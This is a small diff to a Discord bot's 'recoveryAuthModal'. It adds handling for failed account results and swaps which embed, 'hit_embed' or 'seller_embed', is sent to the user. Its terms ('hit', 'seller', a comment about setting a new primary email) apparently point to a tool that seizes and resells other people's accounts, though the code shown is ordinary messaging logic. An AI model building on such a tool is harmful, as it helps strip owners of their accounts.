@@ -35,6 +35,18 @@ class recoveryAuthModal(ui.Modal):
             }
         )
 
+        if isinstance(account, dict) and account.get("failed"):
+            fail_embed = account.get("hit_embed") or account.get("seller_embed")
+            await interaction.followup.send(embed=fail_embed, ephemeral=True)
+            try:
+                await interaction.user.send(embed=fail_embed)
+            except discord.Forbidden:
+                await interaction.followup.send(
+                    "Could not DM you — enable DMs from server members.",
+                    ephemeral=True,
+                )
+            return
+
         if account == "invalid":
             await interaction.followup.send(
                 embed = discord.Embed(
@@ -57,7 +69,8 @@ class recoveryAuthModal(ui.Modal):
             )
             return
         
+        # /secure admin: hit_embed has new primary (sunny@)
         await interaction.user.send(
-            embed=account.get("seller_embed") or account["hit_embed"],
+            embed=account.get("hit_embed") or account["seller_embed"],
         )
     
